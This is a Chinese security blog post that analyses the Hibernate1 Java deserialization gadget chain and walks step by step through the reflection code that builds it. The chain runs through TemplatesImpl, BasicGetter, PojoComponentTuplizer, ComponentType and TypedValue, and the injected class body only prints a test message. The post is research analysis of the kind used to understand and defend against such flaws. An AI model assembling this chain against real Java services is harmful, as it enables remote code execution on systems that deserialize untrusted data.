<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>hibernate1利用链分析 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="hibernate1利用链分析"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 4.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>hibernate1利用链分析</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/07/31/hibernate1利用链分析/" rel="bookmark">
        <time class="entry-date published" datetime="2021-07-31T05:05:31.000Z">
          2021-07-31
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>​        最近做项目刚好遇到了反序列化漏洞，在项目中依赖了hibernate组件，借此机会分析下hibernate利用链。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​        首先看下最终反序列化漏洞的触发点，这个漏洞的触发点在<code>org.hibernate.property.BasicPropertyAccessor.BasicGetter#get</code>中，在这这个方法中使用了method.invoke反射调用。这里的method是从属性中获取的，因此是可控的，所以下来需要找到可以控制target参数的点。</p>
<a id="more"></a>![image-20210731132141740](hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731132141740-16277089018891.png)

<p>​        在<code>org.hibernate.tuple.component.AbstractComponentTuplizer#getPropertyValue</code>中调用了get方法，其中getters属性为Getter接口类型的数组，他的实现类中包含了BasicGetter，所以只要这里的getters属性中传入的是BasicGetter对象，根据java的多态原则，实际上会调用到BasicGetter的get方法。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731151006436.png" alt="image-20210731151006436"></p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731151055144.png" alt="image-20210731151055144"></p>
<p>​        由于<code>org.hibernate.tuple.component.AbstractComponentTuplizer</code>类是抽象类，不能通过newInstance获取对象，因此只能先获取其子类，通过子类的getPropertyValue方法调用get方法。比如<code>org.hibernate.tuple.component.PojoComponentTuplizer</code>类，子类实现中并没有重写两个参数的getPropertyValue方法，创建子类后传入两个参数调用getPropertyValue方法，会自动调用父类的getPropertyValue方法。</p>
<p>​        在<code>org.hibernate.type.ComponentType#getHashCode(java.lang.Object)</code>中调用了getPropertyValue方法。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731162742814.png" alt="image-20210731162742814"></p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731162751228.png" alt="image-20210731162751228"></p>
<p>​        最后在<code>org.hibernate.engine.spi.TypedValue</code>中的readObject中调用了initTransients，而initTransients中调用了getHashCode，所以整条链就串起来了。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210731163100120.png" alt="image-20210731163100120"></p>
<p>​        但是仅仅这样还不够，我们要充分理解这条调用链，得先了解下面的几个问题。</p>
<h3 id="漏洞疑问"><a href="#漏洞疑问" class="headerlink" title="漏洞疑问"></a>漏洞疑问</h3><h4 id="如何给method属性赋值？"><a href="#如何给method属性赋值？" class="headerlink" title="如何给method属性赋值？"></a><strong>如何给method属性赋值？</strong></h4><p>​        在BasicGetter中，method的属性是transient修饰的，也就是说当我们通过writeObject去给method属性赋值时，是不会将method属性的内容写入到序列化数据中的。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210802175802216.png" alt="image-20210802175802216"></p>
<p>​        先说结论吧，在BasicGetter中定义了readResolve方法，在反序列化的过程中会自动调用这个方法，先看下这个方法的定义。调用createGetter方法获取一个BasicSetter对象，之所以写在readResolve中，主要是为了让序列化和反序列化过程中，BasicGetter对象保持单例。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210802192603173.png" alt="image-20210802192603173"></p>
<p>​        在编写程序时，有时候我们希望某个对象是单例模式，比如spring中的bean,并且这个对象是可以进行序列化和反序列化的，当我们正常去写单例模式，进行序列化和反序列化后，实际上得到的已经不是一个对象了，可以通过下面的栗子进行证明。</p>
<p>来自：<a href="https://zhuanlan.zhihu.com/p/136769959" target="_blank" rel="noopener">单例、序列化和readResolve()方法</a></p>
<p>​    首先写一个类，为了让这个类保持单例模式，只有通过getInstance方法才能获取到实例，不能通过构造方法创建实例。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HungrySingleton</span>  <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HungrySingleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> HungrySingleton hungry = <span class="keyword">new</span> HungrySingleton();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hungry;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        下面写一个测试代码,测试序列化后的对象和序列化之前的对象是否相等。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HungrySingleton s1 = HungrySingleton.getInstance();</span><br><span class="line">        HungrySingleton s2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 将s1序列化到磁盘</span></span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"a.obj"</span>);</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            oos.writeObject(s1);</span><br><span class="line">            oos.flush();</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"a.obj"</span>);</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">            <span class="comment">// 从磁盘反序列化</span></span><br><span class="line">            s2 = (HungrySingleton) ois.readObject();</span><br><span class="line">            System.out.println(s1==s2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        实际结果为false，可以证明反序列化后的对象和反序列化前的对象不是一个对象。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210802194019766.png" alt="image-20210802194019766"></p>
<p>​        下面在<code>HungrySingleton</code>中加上readResolve方法，再次运行项目，可以看到反序列化后的对象和序列化的对象是一个对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> hungry;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803085606856-16279521673471.png" alt="image-20210803085606856"></p>
<p>​        上面我们证明了如果存在readResolve方法，在反序列化的过程中会自动调用readResolve(),放到hibernate利用链中来讲，可以通过readResolve方法给method属性赋值,大致的调用栈如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BasicPropertyAccessor.getSetterOrNull(Class, String)  (org.hibernate.property)</span><br><span class="line">    BasicPropertyAccessor.getSetterOrNull(Class, String)(<span class="number">2</span> usages)  (org.hibernate.property)</span><br><span class="line">    BasicPropertyAccessor.createSetter(Class, String)  (org.hibernate.property)</span><br><span class="line">        BasicSetter in BasicPropertyAccessor.readResolve()  (org.hibernate.property)</span><br></pre></td></tr></table></figure>

<p>​        在<code>getGetterOrNull</code>方法中，通过getterMethod方法获取method对象，并通过BasicGetter的构造方法为该对象赋值。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803121506054.png" alt="image-20210803121506054"></p>
<p>​        <code>org.hibernate.property.BasicPropertyAccessor#getterMethod</code>遍历theClass中的所有方法，查找以get或is开头的并且去掉get或is后和propertyName相同的method并返回。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803121709809.png" alt="image-20210803121709809"></p>
<p>​        theClass是从哪里传入的，经过跟代码发现是从clazz属性中传入的而propertyName也是可以通过构造方法设置的，所以可以通过控制这两个属性来间接给method属性传值。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803122558877.png" alt="image-20210803122558877"></p>
<h4 id="为什么要使用TemplatesImpl来利用？"><a href="#为什么要使用TemplatesImpl来利用？" class="headerlink" title="为什么要使用TemplatesImpl来利用？"></a><strong>为什么要使用TemplatesImpl来利用？</strong></h4><p>​        看网上Hibernate1利用链的分析文章，最终是将结果导向了TemplatesImpl类来完成利用，但是实际经过我们的分析，其实只要是满足下面几点都是可以利用的。</p>
<ul>
<li>存在无参的public访问权限的getter或is方法</li>
<li>通过getter或is方法可以间接执行代码或者执行命令</li>
</ul>
<p>对于TemplatesImpl利用链之前并没有了解过，所以也借此机会分析下TemplatesImpl为什么可以完成利用。</p>
<p>​        首先看下TemplatesImpl能被利用的根本原因，重写了defineClass可以从字节数组加载class对象，当然defineClass后并不会执行静态方法或者代码块,只有通过newInstance构造时，才会执行构造方法和静态代码块。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803130758635.png" alt="image-20210803130758635"></p>
<p>​        所以要想利用这个链，光靠defineClass是不够的，还要找到newinstance的点。于是找到了如下调用链。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">	TemplatesImpl.defineTransletClasses() </span><br><span class="line">    	TemplatesImpl.getTransletInstance()</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803132953121.png" alt="image-20210803132953121"></p>
<p>​        而_class属性对应的Class对象是通过 _bytecodes属性的内容通过defineClass加载后得到的。并且 _name属性的内容不能为空，否则不会继续执行getTransletInstance方法。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803133152087.png" alt="image-20210803133152087"></p>
<p>​        所以下来我们要给 _name和 _bytecodes赋值，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#TemplatesImpl(byte[][], java.lang.String, java.util.Properties, int, com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl)</code>可以做到这一点。</p>
<p>​        通过这个构造方法，首先可以给_bytecodes属性赋值，其次在init方法中，会将transletName的值赋给 _name属性。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803134344646.png" alt="image-20210803134344646"></p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803134443903.png" alt="image-20210803134443903"></p>
<p>​        在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code>中会去判断defineClass加载的类是否为<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类，如果不是则会抛出异常不会执行newInstance操作，因此我们构造的类必须是AbstractTranslet的子类。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803153842077.png" alt="image-20210803153842077"></p>
<p>​        最后需要注意的是getTransletInstance方法是private修饰的，也就是说不能直接通过invoke调用，所以要找到一个public的getter方法串到getTransletInstance,查看调用链，找到了getOutputProperties方法，所以只要通过invoke调用getOutputProperties即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getTransletInstance</span><br><span class="line">    TemplatesImpl.newTransformer</span><br><span class="line">        TemplatesImpl.getOutputProperties</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803153357589.png" alt="image-20210803153357589"></p>
<h4 id="如何构造动态Class？"><a href="#如何构造动态Class？" class="headerlink" title="如何构造动态Class？"></a><strong>如何构造动态Class？</strong></h4><p>​        根据上述的需求，我们需要动态构造一个Class并且在它的无参构造方法写上我们想要执行的代码，可以通过javasist来实现，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        String clazzName = <span class="string">"test666"</span>;</span><br><span class="line">        CtClass targetClass = pool.makeClass(clazzName);</span><br><span class="line">targetClass.setSuperclass(pool.get(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>));</span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[] &#123;&#125;, targetClass);</span><br><span class="line">        cons.setBody(<span class="string">"&#123;System.out.println(\"Hello World!!!\");&#125;"</span>);</span><br><span class="line">        targetClass.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteArray = targetClass.toBytecode();</span><br><span class="line">        FileOutputStream output = <span class="keyword">new</span> FileOutputStream(<span class="string">"D:\\test666.class"</span>);</span><br><span class="line">        output.write(byteArray);</span><br></pre></td></tr></table></figure>

<p>​        生成的Class内容如下。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803154222691.png" alt="image-20210803154222691"></p>
<h4 id="如何构造TemplatesImpl对象并完成调用？"><a href="#如何构造TemplatesImpl对象并完成调用？" class="headerlink" title="如何构造TemplatesImpl对象并完成调用？"></a>如何构造TemplatesImpl对象并完成调用？</h4><p>​            上面我们已经动态构造好了需要执行的类并得到了该类的字节码，下面我们只要构造好TemplatesImpl对象并调用getOutputProperties即可完成利用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">String clazzName = <span class="string">"test666"</span>;</span><br><span class="line">CtClass targetClass = pool.makeClass(clazzName);</span><br><span class="line">targetClass.setSuperclass(pool.get(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>));</span><br><span class="line">CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[] &#123;&#125;, targetClass);</span><br><span class="line">cons.setBody(<span class="string">"&#123;System.out.println(\"Hello World!!!\");&#125;"</span>);</span><br><span class="line">targetClass.addConstructor(cons);</span><br><span class="line"><span class="keyword">byte</span>[] byteArray = targetClass.toBytecode();</span><br><span class="line"><span class="keyword">byte</span>[][] b= &#123;byteArray&#125;;</span><br><span class="line">Class&lt;TemplatesImpl&gt; clazz = (Class&lt;TemplatesImpl&gt;) Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">Constructor&lt;TemplatesImpl&gt; con =  clazz.getDeclaredConstructor(<span class="keyword">byte</span>[][]<span class="class">.<span class="keyword">class</span>,<span class="title">String</span>.<span class="title">class</span>, <span class="title">Properties</span>.<span class="title">class</span>,<span class="title">int</span>.<span class="title">class</span>, <span class="title">TransformerFactoryImpl</span>.<span class="title">class</span>)</span>;</span><br><span class="line">con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Properties pro=<span class="keyword">new</span> Properties();</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">2</span>;</span><br><span class="line">TemplatesImpl impl=  con.newInstance(b,<span class="string">"xxx"</span>,pro,a,TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line">Method method=clazz.getMethod(<span class="string">"getOutputProperties"</span>);</span><br><span class="line">method.invoke(impl);</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803154552018.png" alt="image-20210803154552018"></p>
<p>​        通过上面的分析，我们已经完成了从invoke到任意代码执行的利用，接下来我们需要构造如何从readObject调用到invoke方法。</p>
<h4 id="如何构造对象从readObject到invoke"><a href="#如何构造对象从readObject到invoke" class="headerlink" title="如何构造对象从readObject到invoke?"></a>如何构造对象从readObject到invoke?</h4><p><strong>BasicGetter构造</strong></p>
<p>​        我们从invoke往上推，我们知道<code>org.hibernate.property.BasicPropertyAccessor.BasicGetter#get</code>中调用了invoke方法，再到上层调用getPropertyValue时，我们需要让this.getters中的内容为BasicGetter，并且component的内容为我们构造好的TemplatesImpl对象。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803160011764.png" alt="image-20210803160011764"></p>
<p>​        所以首先构造BasicGetter对象，由于BasicGetter只有private的构造方法，所以只能通过反射调用构造方法得到BasicGetter对象。另外根据之前的分析通过clazz和propertyName属性来动态构造的method属性，所以clazz属性要传入TemplatesImpl的Class，propertyName传入getOutputProperties。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803160435736.png" alt="image-20210803160435736"></p>
<p>​        所以得到了如下代码段。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;BasicPropertyAccessor.BasicGetter&gt; clazz2 = (Class&lt;BasicPropertyAccessor.BasicGetter&gt;) Class.forName(<span class="string">"org.hibernate.property.BasicPropertyAccessor$BasicGetter"</span>);</span><br><span class="line">      Constructor&lt;BasicPropertyAccessor.BasicGetter&gt; con2 =  clazz2.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Method</span>.<span class="title">class</span>,<span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">      con2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      BasicPropertyAccessor.BasicGetter getter= con2.newInstance(clazz,method,<span class="string">"OutputProperties"</span>);</span><br></pre></td></tr></table></figure>

<p>​        可以直接通过调用get方法来排错。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803162001005.png" alt="image-20210803162001005"></p>
<p><strong>构造PojoComponentTuplizer对象</strong></p>
<p>​        得到BasicGetter对象后，要将BasicGetter的内容赋值到AbstractComponentTuplizer的getters属性中，在AbstractComponentTuplizer。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803162804724.png" alt="image-20210803162804724"></p>
<p>​        AbstractComponentTuplizer是抽象类，不能创建对象，可以通过其子类来构建。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803163344843.png" alt="image-20210803163344843"></p>
<p>​        我们可以先创建一个PojoComponentTuplizer的实例，再通过反射修改getters字段的内容。但是使用这种方式我们需要构造一个Component对象，这个对象构造起来比较麻烦，参考ysoserial的实现，是通过reflectionFactory 在不调用构造方法的情况下创建对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;PojoComponentTuplizer&gt; clazz3 = (Class&lt;PojoComponentTuplizer&gt;) Class.forName(<span class="string">"org.hibernate.tuple.component.PojoComponentTuplizer"</span>);</span><br><span class="line">Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(clazz3,  Object.class.getConstructor(new Class[0]));</span><br><span class="line">PojoComponentTuplizer pojo= (PojoComponentTuplizer) sc.newInstance(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p>​        下面通过反射修改getters属性的内容</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;AbstractComponentTuplizer&gt; clazz4 = (Class&lt;AbstractComponentTuplizer&gt;) Class.forName(<span class="string">"org.hibernate.tuple.component.AbstractComponentTuplizer"</span>);</span><br><span class="line">       Field getters=clazz4.getDeclaredField(<span class="string">"getters"</span>);</span><br><span class="line">       getters.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       BasicPropertyAccessor.BasicGetter[] gets=&#123;getter&#125;;</span><br><span class="line">       getters.set(pojo,gets);</span><br></pre></td></tr></table></figure>

<p>​        可以通过调用<code>pojo.getPropertyValue(impl,0);</code>测试是否设置成功。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803192512488.png" alt="image-20210803192512488"></p>
<p><strong>ComponentType构造</strong></p>
<p>​        继续看后面对象的构造，主要是利用了getHashCode方法。想要调用到PojoComponentTuplizer对象，需要让<code>this.propertyTypes[i]</code>的值为PojoComponentTuplizer对象,但是propertyTypes是一个Type类型的数组，而我们想要传的PojoComponentTuplizer并不是Type类型，所以不能通过<code>this.propertyTypes[i]</code>传递PojoComponentTuplizer对象。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803193257798.png" alt="image-20210803193257798"></p>
<p>​        在<code>org.hibernate.type.ComponentType#getPropertyValue(java.lang.Object, int)</code>中，存在如下调用，这里当component不为Object数组时，会调用<code>this.componentTuplizer.getPropertyValue(component, i);</code>，而componentTuplizer是ComponentTuplizer类型，PojoComponentTuplizer间接实现了该接口，所以是可以在这里传入PojoComponentTuplizer对象的。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803195829312.png" alt="image-20210803195829312"></p>
<p>​        另外i的内容由属性propertySpan控制，给这个属性赋值即可。</p>
<p>​        接下来要先构造ComponentType对象，这个对象的构造方法同样需要多个参数，不是很好构造，所以也可以通过reflectionFactory来进行构造。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803193736390.png" alt="image-20210803193736390"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;ComponentType&gt; CompType = (Class&lt;ComponentType&gt;) Class.forName(<span class="string">"org.hibernate.type.ComponentType"</span>);</span><br><span class="line">Constructor&lt;?&gt; sc2 = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(CompType,  Object.class.getConstructor(new Class[0]));</span><br><span class="line">ComponentType comp= (ComponentType) sc2.newInstance(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<p>​        下面只要通过反射给相应的字段赋值即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Field compTuplizer=CompType.getDeclaredField(<span class="string">"componentTuplizer"</span>);</span><br><span class="line">        compTuplizer.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        compTuplizer.set(comp,pojo);</span><br><span class="line">        Field propSpan=CompType.getDeclaredField(<span class="string">"propertySpan"</span>);</span><br><span class="line">        propSpan.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        propSpan.set(comp,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>​        可以通过<code>comp.getHashCode(impl);</code>来测试是否成功。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803213216204.png" alt="image-20210803213216204"></p>
<p><strong>TypedValue构造</strong></p>
<p>​        在<code>initTransients</code>中调用了getHashCode方法，所以只要将type赋值为我们构造好的ComponentType对象，value赋值为templateImpl对象即可。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803213335853.png" alt="image-20210803213335853"></p>
<p>​        所以最后一步为<code>TypedValue vaule=new TypedValue(comp,impl);</code></p>
<h4 id="为什么不直接构造TypedValue进行反序列化？"><a href="#为什么不直接构造TypedValue进行反序列化？" class="headerlink" title="为什么不直接构造TypedValue进行反序列化？"></a>为什么不直接构造TypedValue进行反序列化？</h4><p>​        经过我们的分析其实在TypedValue中的readObject方法就已经可以将整条链穿起来了，但实际上ysoserial并没有这么做，参考网上其他师傅的分析文章，也没有讲原因。我自己先构造TypeValue进行测试，发现虽然确实可以到initTransients方法中，但是并不会执行匿名内部类中的方法。</p>
<p><img src="/2021/07/31/hibernate1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210803224610712.png" alt="image-20210803224610712"></p>
